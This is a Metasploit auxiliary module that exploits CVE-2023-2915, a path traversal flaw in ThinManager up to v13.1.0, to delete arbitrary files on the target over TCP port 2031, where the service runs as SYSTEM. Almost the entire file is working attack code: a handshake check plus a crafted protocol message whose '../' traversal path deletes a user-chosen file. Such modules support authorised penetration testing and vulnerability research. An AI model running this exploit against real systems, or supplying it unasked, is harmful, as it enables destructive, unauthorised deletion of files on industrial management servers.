##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ThinManager Path Traversal (CVE-2023-2915) Arbitrary File Delete',
        'Description' => %q{
          This module exploits a path traversal vulnerability (CVE-2023-2915) in
          ThinManager <= v13.1.0 to delete arbitrary files from the system.
          The affected service listens by default on TCP port 2031 and runs in the
          context of NT AUTHORITY\SYSTEM.
        },
        'Author' => [
          'Michael Heinzl', # MSF Module
          'Tenable' # Discovery and PoC
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2023-2915'],
          ['URL', 'https://www.tenable.com/security/research/tra-2023-28'],
          ['URL', 'https://support.rockwellautomation.com/app/answers/answer_view/a_id/1140471']
        ],
        'DisclosureDate' => '2023-08-17',
        'DefaultOptions' => {
          'RPORT' => 2031,
          'SSL' => 'False'
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('FILE', [false, 'The file to delete from the target system.', '/tmp/foo.txt']),
        OptInt.new('DEPTH', [ true, 'The traversal depth. The FILE path will be prepended with ../ * DEPTH', 7 ])
      ]
    )
  end

  def check
    begin
      connect
    rescue Rex::ConnectionTimeout
      print_error("Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed.")
      return Exploit::CheckCode::Unknown
    end

    vprint_status('Sending handshake...')
    handshake = [0x100].pack('V')
    vprint_status(Rex::Text.to_hex_dump(handshake))
    sock.put(handshake)

    res = sock.get_once(4096, 5)
    expected_header = "\x00\x04\x00\x01\x00\x00\x00\x08".b

    if res&.start_with?(expected_header)
      vprint_status('Received handshake response.')
      vprint_status(Rex::Text.to_hex_dump(res))
      disconnect
      return Exploit::CheckCode::Detected
    elsif res
      vprint_status('Received unexpected handshake response:')
      vprint_status(Rex::Text.to_hex_dump(res))
      disconnect
      return Exploit::CheckCode::Safe
    else
      disconnect
      return Exploit::CheckCode::Unknown('No handshake response received.')
    end
  end

  def mk_msg(msg_type, flags, data)
    dlen = data.length
    hdr = [msg_type, flags, dlen].pack('nnN')
    hdr + data
  end

  def run
    print_status('Sending handshake...')

    begin
      connect
    rescue Rex::ConnectionTimeout => e
      fail_with(Failure::Unreachable, "Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed: #{e.message}")
    end

    handshake = [0x100].pack('V')
    vprint_status(Rex::Text.to_hex_dump(handshake))

    begin
      sock.put(handshake)
    rescue StandardError => e
      fail_with(Failure::UnexpectedReply, "Failed during handshake send: #{e.class} - #{e.message}")
    end

    res = sock.get
    if res
      print_status('Received handshake response.')
      vprint_status(Rex::Text.to_hex_dump(res))
    else
      print_error('No handshake response received.')
      fail_with(Failure::Unreachable, "Connection to #{datastore['RHOSTS']}:#{datastore['RPORT']} failed.")
    end

    begin
      fname = datastore['FILE']
      traversal = '../' * 7
      full_fname = traversal + fname
      full_fname = full_fname.gsub(%r{/+}, '/')

      data = [0xaa].pack('N')
      data << "unk_str1\x00"
      data << [1].pack('N')
      data << full_fname.encode('ASCII') + "\x00"

      req = mk_msg(21, 0x0021, data)
    rescue StandardError => e
      fail_with(Failure::BadConfig, "Failed to construct request: #{e.class} - #{e.message}")
    end

    vprint_status(Rex::Text.to_hex_dump(req))

    print_status("Deleting #{fname} from #{datastore['RHOSTS']}")
    sock.put(req)

    begin
      res = sock.get
      if res
        print_good('Received response from target.')
        vprint_status(Rex::Text.to_hex_dump(res)) if res
      else
        print_error('No response received from target.')
      end
    rescue StandardError => e
      fail_with(Failure::TimeoutExpired, "Failed to receive response: #{e.class} - #{e.message}")
    ensure
      disconnect
    end
  end
end
